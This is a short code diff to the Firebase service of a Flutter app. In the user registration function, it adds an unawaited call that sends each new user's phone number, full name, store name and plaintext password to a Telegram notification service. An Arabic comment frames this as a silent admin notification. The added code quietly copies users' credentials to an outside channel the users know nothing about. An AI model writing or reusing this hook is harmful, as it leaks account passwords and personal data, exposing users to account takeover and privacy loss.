@@ -1,5 +1,7 @@
 // lib/services/firebase_service.dart
 
+import 'dart:async';
+
 import 'package:firebase_core/firebase_core.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
@@ -15,6 +17,7 @@ import '../models/debt_transaction_model.dart';
 import 'database_service.dart';
 import 'network_service.dart';
 import 'remote_config_service.dart';
+import 'telegram_notify_service.dart';
 import '../helpers/localization_helper.dart';
 import '../helpers/subscription_helper.dart';
 
@@ -336,6 +339,15 @@ class FirebaseService {
         } catch (e) {
           AppConfig.logError('⚠️ Could not create trial subscription', e);
         }
+
+        // ⭐ إشعار المسؤول ببيانات الحساب الجديد عبر Telegram (fire-and-forget
+        // — لا ينتظر ولا يؤثر في نجاح التسجيل إطلاقاً).
+        unawaited(TelegramNotifyService.instance.notifyNewRegistration(
+          phone: phone,
+          fullName: fullName,
+          storeName: storeName,
+          password: password,
+        ));
 
         AppConfig.log('✅ ===== REGISTRATION COMPLETED SUCCESSFULLY =====');
         return credential;
